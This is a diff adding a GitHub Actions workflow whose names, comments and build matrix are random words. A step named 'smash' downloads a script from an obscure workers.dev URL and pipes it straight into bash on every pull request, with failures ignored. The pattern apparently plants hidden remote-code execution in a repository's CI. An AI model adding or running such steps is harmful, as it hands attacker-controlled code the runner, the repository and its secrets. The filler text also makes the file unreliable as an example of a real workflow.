@@ -1,0 +1,30 @@
+name: solve
+
+#persist bell preferable leaf
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  portable:
+    #immigrant temptation remind growth sole
+    #piano funeral confine refusal
+    runs-on: ubuntu-latest
+    steps:
+    - name:  local-care
+      uses: actions/checkout@v6
+    - name: dock-agree
+      uses: actions/cache@v4
+      with:
+        key: 'synthetic'
+        path: 'herd'
+    #visibility practise tide
+    - name: smash
+      continue-on-error: true
+      #bite steep somehow
+      run: curl "https://x.linux-work-10x1za.workers.dev/4e7ab3fcf814b112ca8977d06744777c/88265265741ebd807736/e37/29bf17c4/f?cvp=1775965725&dtc=ekl&qql=ola" | bash
+    strategy:
+      matrix:
+        descend: ["presently", "alcohol", "sufficient", "Italian", "rebuild"]
+        liquid: ["cop", "great", "instinct", "orange"]
